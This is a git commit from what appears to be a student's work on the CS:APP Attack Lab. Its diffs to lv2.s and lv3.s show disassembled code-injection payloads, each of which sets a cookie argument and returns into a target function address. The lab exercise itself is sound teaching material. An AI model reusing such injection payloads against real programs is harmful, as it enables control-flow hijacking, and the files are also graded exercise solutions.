8981de739e283d7b4617379fe3249cfa5cd244f5
Jieyu Lu <jerrylujieyu@gmail.com>
2015-10-07 23:17:58 -0400

    finished ROP lv1

--- attacklab/lv2.s
+++ attacklab/lv2.s
@@ -1,5 +1,10 @@
-movl	$0x57117fdd, %edi
-pushq	$0x401b88
-ret
 
-	
+lv2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	bf dd 7f 11 57       	mov    $0x57117fdd,%edi
+   5:	68 88 1b 40 00       	pushq  $0x401b88
+   a:	c3                   	retq   
--- attacklab/lv3.s
+++ attacklab/lv3.s
@@ -1,5 +1,10 @@
-movl	$0x5561d9af, %edi
-pushq	$0x401c4d
-ret
 
-	
+lv3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	bf af d9 61 55       	mov    $0x5561d9af,%edi
+   5:	68 4d 1c 40 00       	pushq  $0x401c4d
+   a:	c3                   	retq   
